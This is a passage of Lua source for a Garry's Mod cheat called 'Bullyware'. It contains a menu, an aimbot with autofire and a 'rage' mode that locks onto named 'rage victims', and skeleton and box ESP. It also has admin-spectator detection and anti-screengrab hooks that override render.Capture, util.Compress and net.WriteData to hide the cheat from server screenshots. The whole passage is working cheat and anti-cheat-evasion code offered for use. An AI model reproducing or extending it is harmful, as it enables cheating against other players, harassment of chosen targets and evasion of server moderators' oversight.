            v.func(v, v.isToggled)
        end
    end

    self.menubar.windows.dropdown:SetTall(#dropdown * 15 + 8)
    self.menubar.windows.dropdown:SetVisible(false)
    self.menubar.windows.dropdown:DockPadding(0, 4, 0, 0)
end

function PANEL:PerformLayout(w, h)
    local mwx, mwy = self.menubar.windows:GetPos()
    local mww, mwh = self.menubar.windows:GetSize()
    self.menubar.windows.dropdown:SetPos(mwx, mwy + mwh)
end

function PANEL:OnKeyCodePressed(keyCode)
    if keyCode == KEY_0 then
        if CurTime() - self.lastopen > 0.4 then
            self:SetVisible(false)
            hook.Run("methamphetamine.mastertoggle", false)
            self.lastopen = CurTime()
        end
    end
end

function PANEL:Paint(w, h)
    surface.SetDrawColor(methamphetamine.colors.backgroundopaque)
    surface.DrawRect(0, 0, w, h)
    local mascot = methamphetamine.mascots[methamphetamine.mascots.active]
    local mat = mascot.mat
    surface.SetDrawColor(methamphetamine.colors.backgroundmascot)
    surface.SetMaterial(mat)
    surface.DrawTexturedRect(mascot.x, mascot.y, mascot.w, mascot.h)
end

vgui.Register("methamphetamine.solutions", PANEL)
local PANEL = {}

function PANEL:Init()
    self:SetSize(640, 460)
    self:SetPos(ScrW() / 2 - 640 / 2, ScrH() / 2 - 460 / 2)
    self:SetResizeable(false)
    self.mainmods = self:Add("DPanel")
    self.mainmods:Dock(TOP)
    self.mainmods:SetTall(20)
    self.mainmods:DockMargin(5, 8, 5, 0)

    self.mainmods.Paint = function(pnl, w, h)
        surface.SetDrawColor(methamphetamine.colors.border)
        surface.DrawRect(0, h - 2, w, 2)
    end

    self.mainmods:DockPadding(2, 0, 0, 0)
    self.cheats = {}
end

function PANEL:AddCheat(name, panel, subPagesTable)
    methamphetamine.mods[name] = {
        _panel = panel,
        _name = name,
    }

    local CHEAT = methamphetamine.mods[name]
    local subPagesTable = subPagesTable or false
    self.cheats[#self.cheats + 1] = self.mainmods:Add("DButton")
    local i = #self.cheats
    local btn = self.cheats[i]
    btn:Dock(LEFT)
    btn:DockMargin(1, 0, 1, 2)
    btn:SetText("")
    surface.SetFont(methamphetamine.default.font)
    local wide, tall = surface.GetTextSize(name)
    btn:SetWide(wide + 8)

    btn.Paint = function(pnl, w, h)
        surface.SetDrawColor((pnl:IsHovered() or pnl.panel == self.cheats.active) and methamphetamine.colors.activebutton or methamphetamine.colors.border)
        surface.DrawRect(0, 0, w, h)
        draw.SimpleText(name, methamphetamine.default.font, w / 2, h / 2, methamphetamine.colors.disabledtext, 1, 1)
    end

    btn.panel = self:Add(panel or "DButton")
    btn.panel:Dock(FILL)
    btn.panel:SetVisible(false)

    if panel == "methamphetamine.submods" then
        btn.panel:DockMargin(5, 0, 5, 5)
    else
        btn.panel:DockMargin(8, 8, 8, 8)
    end

    btn.DoClick = function(pnl)
        if self.cheats[i].panel == self.cheats.active and self.cheats[i].panel:IsVisible() then return end
        self.cheats[i].panel:SetVisible(true)

        if self.cheats.active then
            self.cheats.active:SetVisible(false)
        end

        self.cheats.active = self.cheats[i].panel
    end

    if subPagesTable and panel == "methamphetamine.submods" then
        for k, v in ipairs(subPagesTable) do
            btn.panel:AddCheat(v.name, v.panel)
        end

        --PrintTable( subPagesTable )
        if subPagesTable[0] and subPagesTable[0].master == true then
            btn.panel.mods:DockMargin(0, 0, 0, 0)
            btn.panel.mods.master = btn.panel:Add("DPanel")
            local master = btn.panel.mods.master
            master:Dock(TOP)
            master:SetTall(33)
            master:SetZPos(-1)
            master.Paint = nil
            master.contents = master:Add("Panel")
            master.contents:Dock(LEFT)
            master.contents:DockMargin(5, 8, 5, 5)
            master.contents:SetWide(300)
            master.toggle = master.contents:Add("methamphetamine.checkbox")
            master.toggle:Dock(LEFT)
            master.toggle:SetWide(20)

            master.toggle.OnToggle = function(pnl, state)
                methamphetamine.mods[name].MasterToggle = state
                print("MasterToggle = ", state)
            end

            master.toggle:DockMargin(0, 0, 60, 0)
            master.bindLabel = master.contents:Add("DLabel")
            master.bindLabel:Dock(LEFT)
            master.bindLabel:SetFont(methamphetamine.default.font)
            master.bindLabel:SetTextColor(methamphetamine.colors.text)
            master.bindLabel:SetText("| Key to toggle visuals")
            master.bindLabel:SizeToContents()
            master.keybind = master.contents:Add("methamphetamine.binder")
            master.keybind:Dock(LEFT)
            master.keybind:SetWide(80)
            master.keybind:DockMargin(4, 0, 0, 0)
            master.keybind:SetValue(methamphetamine.mods[name].masterToggleKeybind)

            master.keybind.OnChange = function(pnl, val)
                methamphetamine.mods[name].masterToggleKeybind = val
            end

            hook.Add("PlayerButtonUp", "methamphetamine.visualsToggle", function(ply, key)
                if key == methamphetamine.mods[name].masterToggleKeybind then
                    methamphetamine.mods[name].MasterToggle = not (methamphetamine.mods[name].MasterToggle or false)
                    master.keybind:SetValue(methamphetamine.mods[name].masterToggleKeybind)
                end
            end)
        end

        if subPagesTable[0] and subPagesTable[0].defaultPage then
            btn.panel:SetActive(subPagesTable[0].defaultPage)
        end
    end
end

function PANEL:SetActive(i)
    self.cheats[i].panel:SetVisible(true)

    if self.cheats.active then
        self.cheats.active:SetVisible(false)
    end

    self.cheats.active = self.cheats[i].panel
end

vgui.Register("methamphetamine.solutions.main", PANEL, "methamphetamine.frame")
local frame = vgui.Create("methamphetamine.solutions")
frame:Dock(FILL)
methamphetamine.master = frame
local pp = vgui.Create("methamphetamine.solutions.main", frame)
methamphetamine.frame = pp
pp:SetTitle("Bullyware [WIP]")

pp:AddCheat("Aim", "methamphetamine.submods", {
    [0] = {
        ["defaultPage"] = 1,
    },
    {
        name = "Aimbot",
        panel = "methamphetamine.aim.aimbot",
    },
    {
        name = "Triggerbot",
        panel = "Panel",
    },
})

pp:AddCheat("ESP", "methamphetamine.submods", {
    [0] = {
        ["master"] = true,
        ["defaultPage"] = 1
    },
    {
        name = "Player",
        panel = "methamphetamine.esp.player",
    },
    {
        name = "Entity",
        panel = "Panel"
    },
})

pp:AddCheat("Fonts")
pp:AddCheat("HvH")
pp:AddCheat("Misc")
pp:AddCheat("Configs", "methamphetamine.configs")
pp:AddCheat("Theme Editor")
pp:SetActive(1)

function meth_toggle(mode)
    frame:SetVisible(mode)
end

hook.Add("PlayerButtonDown", "methamphetamine.toggle", function(ply, key)
    if key == KEY_0 then
        if frame:IsVisible() then return end

        if CurTime() - (frame.lastopen or 1) > 0.4 then
            frame:SetVisible(true)
            hook.Run("methamphetamine.mastertoggle", true)
            frame.lastopen = CurTime()
        end
    end
end)

--[[
    ____        ______     _       __              
   / __ )__  __/ / / /_  _| |     / /___ _________ 
  / __  / / / / / / / / / / | /| / / __ `/ ___/ _ \
 / /_/ / /_/ / / / / /_/ /| |/ |/ / /_/ / /  /  __/
/_____/\__,_/_/_/_/\__, / |__/|__/\__,_/_/   \___/ 
                  /____/                           
]]--


methamphetamine = methamphetamine or {}
methamphetamine.adminspectators = {}
methamphetamine.ragevictims = {}
methamphetamine.limbs = {
    ["Head"] = "ValveBiped.Bip01_Head1",
    ["Spine"] = "ValveBiped.Bip01_Spine",
}

methamphetamine.bones = {
    "ValveBiped.Bip01_Head1",
    "ValveBiped.Bip01_Neck1",
    "ValveBiped.Bip01_Spine4",
    "ValveBiped.Bip01_Spine2",
    "ValveBiped.Bip01_Spine1",
    "ValveBiped.Bip01_Spine",
    "ValveBiped.Bip01_Pelvis",
    "ValveBiped.Bip01_R_UpperArm",
    "ValveBiped.Bip01_R_Forearm",
    "ValveBiped.Bip01_R_Hand",
    "ValveBiped.Bip01_L_UpperArm",
    "ValveBiped.Bip01_L_Forearm",
    "ValveBiped.Bip01_L_Hand",
    "ValveBiped.Bip01_R_Thigh",
    "ValveBiped.Bip01_R_Calf",
    "ValveBiped.Bip01_R_Foot",
    "ValveBiped.Bip01_R_Toe0",
    "ValveBiped.Bip01_L_Thigh",
    "ValveBiped.Bip01_L_Calf",
    "ValveBiped.Bip01_L_Foot",
    "ValveBiped.Bip01_L_Toe0"  
}

local LocalPlayer = LocalPlayer

local function meth_getPlayers()
    return player.GetAll()
end

methamphetamine.screengrab = false
methamphetamine.lastscreengrab = 0
local renderv = render.RenderView
local renderc = render.Clear
local rendercap = render.Capture
local vguiworldpanel = vgui.GetWorldPanel

local function screengrab()
	if methamphetamine.screengrab then return end
    methamphetamine.screengrab = true
    surface.PlaySound("physics/metal/paintcan_impact_soft1.wav")
    methamphetamine.lastscreengrab = CurTime()
    print("screen grabbed")
    
 
	renderc( 0, 0, 0, 255, true, true )
	renderv( {
		origin = LocalPlayer:EyePos(),
		angles = LocalPlayer:EyeAngles(),
		x = 0,
		y = 0,
		w = ScrW(),
		h = ScrH(),
		dopostprocess = true,
		drawhud = true,
		drawmonitors = true,
		drawviewmodel = true
	} )
 
	local vguishits = vguiworldpanel()
 
	if IsValid( vguishits ) then
		vguishits:SetPaintedManually( true )
	end
 
	timer.Simple( 0.1, function()
		vguiworldpanel():SetPaintedManually( false )
		methamphetamine.screengrab = false
	end)
end
 
render.Capture = function(data)
	screengrab()
	local cap = rendercap( data )
	return cap
end
local string_find = string.find
local function screengrab_str(str)
    str = string.lower(str)
    if string_find(str,"screengrab") then return true end
    if string_find(str,"grab") then return true end
    if string_find(str,"scren") then return true end
    if string_find(str,"cheat") then return true end
    if string_find(str,"anti") then return true end
    if string_find(str,"hack") then return true end
    return false
end

concommand.Add("screenshot",function()
    methamphetamine.screengrab = true
    timer.Simple(0.1,function() methamphetamine.screengrab = false end)
end)

local _compress = util.Compress
function util.Compress( str )
    methamphetamine.screengrab = true
    if screengrab_str( str ) then
        methamphetamine.lastscreengrab = CurTime()
    end
    timer.Simple(0.1,function() methamphetamine.screengrab = false end)
    return _compress(str)
end

local _writedata = net.WriteData
function net.WriteData( data,size )
    methamphetamine.screengrab = true
    timer.Simple(0.1,function() methamphetamine.screengrab = false end)
    return _writedata(data,size)
end

-- local _netstart = net.Start
-- function net.Start( str )
--     methamphetamine.screengrab = true
--     methamphetamine.lastscreengrab = CurTime()
--     methamphetamine.screengrab = false
--     return _netstart(str)
-- end

function methamphetamine:CheckForSpectators()
    local targets = {}
    for k , v in ipairs(meth_getPlayers()) do
        if v:GetObserverTarget() == LocalPlayer then
            targets[#targets+1] = v
        end
    end
    methamphetamine.adminspectators = targets
    methamphetamine.Log("Checking for spectators")
    return targets
end

timer.Create("methamphetamine.adminspectatorscheck", 6 , 0 , methamphetamine.CheckForSpectators )

function  methamphetamine:IsPlayerWithinFOV( player , fov )
    if not player then return false end
 
    if LocalPlayer:GetEyeTraceNoCursor().Entity == player then return true end

    --local fov = (methamphetamine.mods["Aim"].FOV / 30)
    --print( fov )
    -- local CurAngle = LocalPlayer:EyeAngles()
    -- local CurPos = LocalPlayer:GetShootPos()

    -- local AimSpot = player:GetBonePosition(player:LookupBone(methamphetamine.bones[1]))

    -- local FinAngle = ( AimSpot - CurPos ):Angle()
    -- if FinAngle.y > 180 then
    --     FinAngle.y = FinAngle.y-360
    -- end

    -- local CalcX = FinAngle.y - CurAngle.y
    -- local CalcY = FinAngle.x - CurAngle.x
    -- if CalcY < 0 then CalcY = CalcY * -1 end
    -- if CalcX < 0 then CalcX = CalcX * -1 end
    -- if CalcY > 180 then CalcY = 360 - CalcY end
    -- if CalcX > 180 then CalcX = 360 - CalcX end
    -- if CalcX <= fov/2 && CalcY <= fov*0.4 then
    --     return true 
    -- end

    local head = player:LookupBone("ValveBiped.Bip01_Head1")  

    local headpos,headang = player:GetBonePosition(head or 1) 

    local spine = player:LookupBone("ValveBiped.Bip01_Spine1") 
    local spinepos,spineang = player:GetBonePosition(spine or 1) 

    local shootpos = LocalPlayer:GetShootPos()

    --print("FOV : ", fov )
    if IsValid( spinepos ) then
        if (LocalPlayer:GetAimVector():Dot( player:GetPos() - shootpos ) / ( player:GetPos() - shootpos ):Length() >= (fov or 0.997)) then --or
            -- (LocalPlayer:GetAimVector():Dot( headpos - shootpos ) / ( headpos - shootpos ):Length() >= (fov or 0.997)) or
            -- (LocalPlayer:GetAimVector():Dot( spinepos - shootpos ) / ( spinepos - shootpos ):Length() >= (fov or 0.997)) then
            return true
        end
        else
            if (LocalPlayer:GetAimVector():Dot( player:GetPos() - shootpos ) / ( player:GetPos() - shootpos ):Length() >= (fov or 0.997)) then return true end

        end

    return false
end

function  methamphetamine:GetClosestPlayer()
    local ply

    local tTargets = {}
    for k , v in ipairs(player.GetAll()) do
        if v == LocalPlayer or not v:Alive() then goto skipTargetGathering end
        if not methamphetamine:IsPlayerWithinFOV(v,0.95) then goto skipTargetGathering end
        if methamphetamine.mods["Aim"]["Ignore"]["Friends"] then
            if methamphetamine.friends[v] then goto skipTargetGathering end
        elseif methamphetamine.mods["Aim"]["Ignore"]["Noclipping"] then
            if v:GetMoveType() == MOVETYPE_NOCLIP then goto skipTargetGathering end
        elseif methamphetamine.mods["Aim"]["Ignore"]["SelectedTeams"] then
            if methamphetamine.teams[v:Team()] then goto skipTargetGathering end
        elseif methamphetamine.mods["Aim"]["Ignore"]["OppositeTeam"] then
            if v:Team() != LocalPlayer:Team() then print("Skipping") goto skipTargetGathering end
        elseif methamphetamine.mods["Aim"]["Ignore"]["SameTeam"] then
            if v:Team() == LocalPlayer:Team() then print("SameTeam2") goto skipTargetGathering end
        elseif methamphetamine.mods["Aim"]["Ignore"]["Transparent"] then
            if v:GetColor().a != 255 then goto skipTargetGathering end
        elseif methamphetamine.mods["Aim"]["Ignore"]["Invisible"] then
            if v:GetNoDraw() or v:GetRenderMode() == RENDERMODE_TRANSALPHA or v:GetMaterial() ==  "models/effects/vol_light001" then goto skipTargetGathering end
        elseif methamphetamine.mods["Aim"]["Ignore"]["Party"] then

        end

        if methamphetamine:IsPlayerWithinFOV(v,fov) then
            tTargets[#tTargets+1] = v
        end
        ::skipTargetGathering::
    end


    table.sort(tTargets,function(a,b)
        local aBonePos = a:LookupBone( self.limbs["Spine"] ) and a:GetBonePosition( a:LookupBone( self.limbs["Spine"] ) ) or a:GetPos() + a:OBBCenter()
        local bBonePos = b:LookupBone( self.limbs["Spine"] ) and b:GetBonePosition( b:LookupBone( self.limbs["Spine"] ) ) or b:GetPos() + b:OBBCenter()
        local diff = aBonePos - LocalPlayer:GetShootPos()
        local targetdiff = bBonePos - LocalPlayer:GetShootPos()
        return LocalPlayer:GetAimVector():Dot(diff) / diff:Length() > LocalPlayer:GetAimVector():Dot(targetdiff) / targetdiff:Length()
    end)

    for k,v in ipairs(tTargets) do
        if not ply then ply = v end
        if ply:GetPos():DistToSqr(LocalPlayer:GetPos()) > v:GetPos():DistToSqr(LocalPlayer:GetPos()) then ply = v end
    end

    return ply
end

function methamphetamine:AddFriendByKeyword( keyword )
    for k , v in ipairs(meth_getPlayers()) do
        if v == LocalPlayer then goto skip end
        if string.find(string.lower(v:Nick()),string.lower(keyword)) then
            methamphetamine.friends[v] = true
        end
        ::skip::
    end
end

function methamphetamine:RemoveFriendByKeyword( keyword )
    for k , v in pairs(methamphetamine.friends) do
        if string.find(string.lower(k:Nick()),string.lower(keyword)) then
            methamphetamine.friends[k] = nil
        end
    end
end

function methamphetamine:AddRageVictimByKeyword( keyword )
    for k , v in ipairs(meth_getPlayers()) do
        if v == LocalPlayer then goto skip end
        if keyword == "*" then
            methamphetamine.ragevictims[v] = true
            methamphetamine.Log("Adding rage victim ".. v:Nick() )
        elseif string.find(string.lower(v:Nick()),string.lower(keyword)) then
            methamphetamine.ragevictims[v] = true
            methamphetamine.Log("Adding rage victim ".. v:Nick() )
        end
        ::skip::
    end
end

function methamphetamine:RemoveRageVictimByKeyword( keyword )
    for k , v in pairs(methamphetamine.ragevictims) do
        if string.find(string.lower(k:Nick()),string.lower(keyword)) then
            methamphetamine.Log("Removing rage victim ".. k:Nick() )
            methamphetamine.ragevictims[k] = nil
        end
    end
end


concommand.Add("methamphetamine_addfriend", function( ply, cmd, args )
    if not args[1] then return end
    methamphetamine:AddFriendByKeyword( args[1] )
end)

concommand.Add("methamphetamine_removefriend", function( ply, cmd, args )
    if not args[1] then return end
    methamphetamine:RemoveFriendByKeyword( args[1] )
end)


function  methamphetamine:CalculateCurLimbPos( ply , limb )
    local  bone = ply:LookupBone( self.limbs[limb] )
    local bonepos,ang
    if bone then
        bonepos,ang = ply:GetBonePosition( bone ) 
    end
    if not ( bone ) then
        bonepos = ply:GetPos() + ply:OBBCenter()
    end
    
    local tarFrames, plyFrames = ( RealFrameTime() / 25 ), ( RealFrameTime() / 66 )
    return bonepos + ( ( ply:GetVelocity() * ( tarFrames ) ) - ( LocalPlayer:GetVelocity() * ( plyFrames ) ) )
end

function methamphetamine:GetClosestPlayerToCrosshair()
    local closest
    for k , v in ipairs( meth_getPlayers() ) do
        if v == LocalPlayer then goto skip end
        if not v:Alive() then goto skip end

        if methamphetamine.mods["Aim"]["Ignore"]["Friends"] then
            if methamphetamine.friends[v] then goto skip end
        elseif methamphetamine.mods["Aim"]["Ignore"]["Noclipping"] then
            if v:GetMoveType() == MOVETYPE_NOCLIP then goto skip end
        elseif methamphetamine.mods["Aim"]["Ignore"]["SelectedTeams"] then
            if methamphetamine.teams[v:Team()] then goto skip end
        elseif methamphetamine.mods["Aim"]["Ignore"]["OppositeTeam"] then
            if v:Team() != LocalPlayer:Team() then print("Skipping") goto skip end
        elseif methamphetamine.mods["Aim"]["Ignore"]["SameTeam"] then
            if v:Team() == LocalPlayer:Team() then print("SameTeam2") goto skip end
        elseif methamphetamine.mods["Aim"]["Ignore"]["Transparent"] then
            if v:GetColor().a != 255 then goto skip end
        elseif methamphetamine.mods["Aim"]["Ignore"]["Invisible"] then
            if v:GetNoDraw() or v:GetRenderMode() == RENDERMODE_TRANSALPHA or ply:GetMaterial() ==  "models/effects/vol_light001" then goto skip end
        elseif methamphetamine.mods["Aim"]["Ignore"]["Party"] then

        end
        if not methamphetamine:IsPlayerWithinFOV(v,0.95) then goto skip end
        if not closest then closest = v end
        local bonepos = v:LookupBone( self.limbs["Spine"] ) and v:GetBonePosition( v:LookupBone( self.limbs["Spine"] ) ) or v:GetPos() + v:OBBCenter()
        local closestbonepos = closest:LookupBone( self.limbs["Spine"] ) and closest:GetBonePosition( closest:LookupBone( self.limbs["Spine"] ) ) or closest:GetPos() + closest:OBBCenter()
        local diff = bonepos - LocalPlayer:GetShootPos()
        local targetdiff = closestbonepos - LocalPlayer:GetShootPos()
        if LocalPlayer:GetAimVector():Dot(diff) / diff:Length() > LocalPlayer:GetAimVector():Dot(targetdiff) / targetdiff:Length() then
            closest = v
        end
        ::skip::
    end
    return closest
end

local AimbotTarget 
local lastautoshoot = 0

function  methamphetamine:GetPlayerWithHealth( condition,fov )
    local ply

    local tTargets = {}
    if fov then
        for k , v in ipairs(player.GetAll()) do
            if v == LocalPlayer or not v:Alive() then goto skipTargetGathering end
            if methamphetamine.mods["Aim"]["Ignore"]["Friends"] then
                if methamphetamine.friends[v] then goto skipTargetGathering end
            elseif methamphetamine.mods["Aim"]["Ignore"]["Noclipping"] then
                if v:GetMoveType() == MOVETYPE_NOCLIP then goto skipTargetGathering end
            elseif methamphetamine.mods["Aim"]["Ignore"]["SelectedTeams"] then
                if methamphetamine.teams[v:Team()] then goto skipTargetGathering end
            elseif methamphetamine.mods["Aim"]["Ignore"]["OppositeTeam"] then
                if v:Team() != LocalPlayer:Team() then print("Skipping") goto skipTargetGathering end
            elseif methamphetamine.mods["Aim"]["Ignore"]["SameTeam"] then
                if v:Team() == LocalPlayer:Team() then print("SameTeam2") goto skipTargetGathering end
            elseif methamphetamine.mods["Aim"]["Ignore"]["Transparent"] then
                if v:GetColor().a != 255 then goto skipTargetGathering end
            elseif methamphetamine.mods["Aim"]["Ignore"]["Invisible"] then
                if v:GetNoDraw() or v:GetRenderMode() == RENDERMODE_TRANSALPHA or v:GetMaterial() ==  "models/effects/vol_light001" then goto skipTargetGathering end
            elseif methamphetamine.mods["Aim"]["Ignore"]["Party"] then
    
            end

            if methamphetamine:IsPlayerWithinFOV(v,fov) then
                tTargets[#tTargets+1] = v
            end
            ::skipTargetGathering::
        end
    else
        tTargets = player.GetAll()
    end

    table.sort(tTargets,function(a,b)
        local aBonePos = a:LookupBone( self.limbs["Spine"] ) and a:GetBonePosition( a:LookupBone( self.limbs["Spine"] ) ) or a:GetPos() + a:OBBCenter()
        local bBonePos = b:LookupBone( self.limbs["Spine"] ) and b:GetBonePosition( b:LookupBone( self.limbs["Spine"] ) ) or b:GetPos() + b:OBBCenter()
        local diff = aBonePos - LocalPlayer:GetShootPos()
        local targetdiff = bBonePos - LocalPlayer:GetShootPos()
        return LocalPlayer:GetAimVector():Dot(diff) / diff:Length() > LocalPlayer:GetAimVector():Dot(targetdiff) / targetdiff:Length()
    end)

    for k,v in ipairs(tTargets) do
        if not ply then ply = v end
        if condition == "Highest" then
            if v:Health() > ply:Health() then
                ply = v
            end
        else
            if v:Health() < ply:Health() then
                ply = v
            end
        end
    end

    return ply
end

function methamphetamine.SmoothAim( ang )
    if( methamphetamine.mods["Aim"].Smooth == 0 ) then return ang end
	local speed = RealFrameTime() / ( methamphetamine.mods["Aim"].Smooth / 50 )
	local angl = LerpAngle( speed*2.5, LocalPlayer:EyeAngles(), ang )
	return Angle( angl.p, angl.y, 0 )
end

local lastautoshoot
local delay = {}
hook.Add("Think", "Aimbot", function ()
    if not methamphetamine.mods["Aim"].enabled then return end
    if methamphetamine.mods["Aim"].Rage then return end
    if not ( methamphetamine.mods["Aim"].Key ) then return end
    if vgui.CursorVisible() then return end
    if not input.IsKeyDown( methamphetamine.mods["Aim"].Key ) then 
        AimbotTarget = nil
        return 
    end 

    -- local target = methamphetamine:GetClosestPlayer()
    -- if not IsValid( target ) then return end
    -- LocalPlayer:SetEyeAngles( (  methamphetamine:CalculateCurLimbPos( target , "Head" ) - LocalPlayer:GetShootPos() ):Angle() )
    if AimbotTarget then
        if not AimbotTarget:Alive() then AimbotTarget = nil return end 
        if methamphetamine.mods["Aim"]["Autofire"] then
            local wep = LocalPlayer:GetActiveWeapon()
            if LocalPlayer:GetEyeTraceNoCursor().Entity == AimbotTarget then
                RunConsoleCommand("-attack")
                if CurTime() - (lastautoshoot or 0) > (delay[wep] or 0.05) then
                    RunConsoleCommand("+attack") 
                    lastautoshoot = CurTime()
                    delay[wep] = wep.FireDelay or wep.Delay or 0.05
                end
            end
           
        end
        local headpos = methamphetamine:CalculateCurLimbPos( AimbotTarget , methamphetamine.mods["Aim"].Limb )
        local targetpos =  ( headpos  - LocalPlayer:GetShootPos() ):Angle() 
        --if methamphetamine.mods["Aim"]["NoRecoil"] and input.IsMouseDown( MOUSE_LEFT ) then
            --targetpos = targetpos - Angle(0,methamphetamine.CalculateRecoilCompensation(LocalPlayer).y,0)
        --end
        LocalPlayer:SetEyeAngles( methamphetamine.SmoothAim(targetpos) )
    else
        local priority = methamphetamine.mods["Aim"].Priority or "FOV"
        local v
        local log = "Looking for an aimbot target with priority: ".. priority
        -- if methamphetamine.DebugLogs[#methamphetamine.DebugLogs].text != log then
        --     methamphetamine.Log(log)
        -- end
        if priority == "Field of View" then
            v = methamphetamine:GetClosestPlayerToCrosshair()
        elseif priority == "Closest Distance" then
            v = methamphetamine:GetClosestPlayer()
        elseif priority == "Least Health" then
            v = methamphetamine:GetPlayerWithHealth( "Lowest",0.95 )
        elseif priority == "Most Health" then
            v = methamphetamine:GetPlayerWithHealth( "Highest",0.95 )
        end
        -- if methamphetamine:IsPlayerWithinFOV( v , 0.95 ) then
            AimbotTarget = v
        --end
        
    end
end)

local ragetarget 
hook.Add("Think", "AimbotRage", function()
    if not methamphetamine.mods["Aim"].enabled then return end
    if ragetarget and not methamphetamine.mods["Aim"].rage then ragetarget = nil end
    if not methamphetamine.mods["Aim"].Rage then return end
    --print("RAGE")
    for k , v in pairs( methamphetamine.ragevictims ) do
        if not IsValid( k ) then methamphetamine.ragevictims[ v ] = nil goto skiprage end
        if not k:Alive() then goto skiprage end
        if ragetarget then
            if LocalPlayer:GetPos():DistToSqr(k:GetPos()) < LocalPlayer:GetPos():DistToSqr( ragetarget:GetPos() ) then
                ragetarget = k
            end
        else
            ragetarget = k
        end
        local limbpos = (methamphetamine:CalculateCurLimbPos( ragetarget , methamphetamine.mods["Aim"].Limb ))
        LocalPlayer:SetEyeAngles( (( limbpos - LocalPlayer:GetShootPos()) ):Angle() )    
        ::skiprage::
    end
end)

concommand.Add("methamphetamine_rage", function()
    methamphetamine.mods["Aim"].Rage = not methamphetamine.mods["Aim"].Rage
end)

concommand.Add("methamphetamine_removeragevictim", function( ply, cmd, args )
    if not args[1] then return end
    methamphetamine:RemoveRageVictimByKeyword( args[1] )
end)

concommand.Add("methamphetamine_addragevictims", function( ply, cmd, args )
    if not args[1] then return end
    methamphetamine:AddRageVictimByKeyword( args[1] )
end)



--local player = meth_getPlayers()[2]         
-- hook.Add("HUDPaint", "Aimbot", function()
--     if !methamphetamine.mods.ESP.MasterToggle or !methamphetamine.mods.Aim.enabled then return end
--     local r = ScrH() * math.tan(math.rad(methamphetamine.mods["Aim"].FOV/2)) / (2*math.tan(math.rad(LocalPlayer:GetFOV()/2))) -- ScrH() * math.tan(math.rad(fov/2)) / (2*math.tan(math.rad(plyFov/2)))
--     surface.DrawCircle( ScrW()/2,ScrH()/2,r, 255,255,255 )

-- end)

--[[
    ____        ______     _       __              
   / __ )__  __/ / / /_  _| |     / /___ _________ 
  / __  / / / / / / / / / / | /| / / __ `/ ___/ _ \
 / /_/ / /_/ / / / / /_/ /| |/ |/ / /_/ / /  /  __/
/_____/\__,_/_/_/_/\__, / |__/|__/\__,_/_/   \___/ 
                  /____/                           
]]--

local GetAllPlayers = player.GetAll
local ipairs = ipairs
local addHook = hook.Add
local getPosition =  FindMetaTable("Entity").GetPos
local CurTime = CurTime
local drawSurfaceLine = surface.DrawLine
local bones = methamphetamine.bones
local surface = surface
local DrawRect = surface.DrawRect
local DrawText = surface.DrawText
local SetDrawColor = surface.SetDrawColor
local SetTextColor = surface.SetTextColor
local GetTeamColor = team.GetColor
local AddHalo = halo.Add
local sqrt = math.sqrt
local floor = math.floor
local function drawBones( ply )
    local Bones = {}
    for k, v in ipairs(bones) do
        if ply:LookupBone(v) != nil && ply:GetBonePosition(ply:LookupBone(v)) != nil then
            table.insert( Bones, ply:GetBonePosition(ply:LookupBone(v)):ToScreen() )
        else
            return
        end
    end

    drawSurfaceLine( Bones[1].x, Bones[1].y, Bones[2].x, Bones[2].y )
    drawSurfaceLine( Bones[2].x, Bones[2].y, Bones[3].x, Bones[3].y )
    drawSurfaceLine( Bones[3].x, Bones[3].y, Bones[4].x, Bones[4].y )
    drawSurfaceLine( Bones[4].x, Bones[4].y, Bones[5].x, Bones[5].y )
    drawSurfaceLine( Bones[5].x, Bones[5].y, Bones[6].x, Bones[6].y )
    drawSurfaceLine( Bones[6].x, Bones[6].y, Bones[7].x, Bones[7].y )
    drawSurfaceLine( Bones[7].x, Bones[7].y, Bones[14].x, Bones[14].y )
    drawSurfaceLine( Bones[14].x, Bones[14].y, Bones[15].x, Bones[15].y )
    drawSurfaceLine( Bones[15].x, Bones[15].y, Bones[16].x, Bones[16].y )
    drawSurfaceLine( Bones[16].x, Bones[16].y, Bones[17].x, Bones[17].y )
    drawSurfaceLine( Bones[7].x, Bones[7].y, Bones[18].x, Bones[18].y )
    drawSurfaceLine( Bones[18].x, Bones[18].y, Bones[19].x, Bones[19].y )
    drawSurfaceLine( Bones[19].x, Bones[19].y, Bones[20].x, Bones[20].y )
    drawSurfaceLine( Bones[20].x, Bones[20].y, Bones[21].x, Bones[21].y )
    drawSurfaceLine( Bones[3].x, Bones[3].y, Bones[8].x, Bones[8].y )
    drawSurfaceLine( Bones[8].x, Bones[8].y, Bones[9].x, Bones[9].y )
    drawSurfaceLine( Bones[9].x, Bones[9].y, Bones[10].x, Bones[10].y )
    drawSurfaceLine( Bones[3].x, Bones[3].y, Bones[11].x, Bones[11].y )
    drawSurfaceLine( Bones[11].x, Bones[11].y, Bones[12].x, Bones[12].y )
    drawSurfaceLine( Bones[12].x, Bones[12].y, Bones[13].x, Bones[13].y )
    ::skipdrawbone::
end

local function getBounds( Ent )
    local Points = {
        Vector( Ent:OBBMaxs().x, Ent:OBBMaxs().y, Ent:OBBMaxs().z ),
        Vector( Ent:OBBMaxs().x, Ent:OBBMaxs().y, Ent:OBBMins().z ),
        Vector( Ent:OBBMaxs().x, Ent:OBBMins().y, Ent:OBBMins().z ),
        Vector( Ent:OBBMaxs().x, Ent:OBBMins().y, Ent:OBBMaxs().z ),
        Vector( Ent:OBBMins().x, Ent:OBBMins().y, Ent:OBBMins().z ),
        Vector( Ent:OBBMins().x, Ent:OBBMins().y, Ent:OBBMaxs().z ),
        Vector( Ent:OBBMins().x, Ent:OBBMaxs().y, Ent:OBBMins().z ),
        Vector( Ent:OBBMins().x, Ent:OBBMaxs().y, Ent:OBBMaxs().z )
    }
    local MaxX, MaxY, MinX, MinY
    local V1, V2, V3, V4, V5, V6, V7, V8
    for k, v in ipairs( Points ) do
        local ScreenPos = Ent:LocalToWorld( v ):ToScreen()
        if MaxX != nil then
            MaxX, MaxY, MinX, MinY = math.max( MaxX, ScreenPos.x ), math.max( MaxY, ScreenPos.y), math.min( MinX, ScreenPos.x ), math.min( MinY, ScreenPos.y)
        else
            MaxX, MaxY, MinX, MinY = ScreenPos.x, ScreenPos.y, ScreenPos.x, ScreenPos.y
        end

        if V1 == nil then
            V1 = ScreenPos
        elseif V2 == nil then
            V2 = ScreenPos
        elseif V3 == nil then
            V3 = ScreenPos
        elseif V4 == nil then
            V4 = ScreenPos
        elseif V5 == nil then
            V5 = ScreenPos
        elseif V6 == nil then
            V6 = ScreenPos
        elseif V7 == nil then
            V7 = ScreenPos
        elseif V8 == nil then
            V8 = ScreenPos
        end
    end
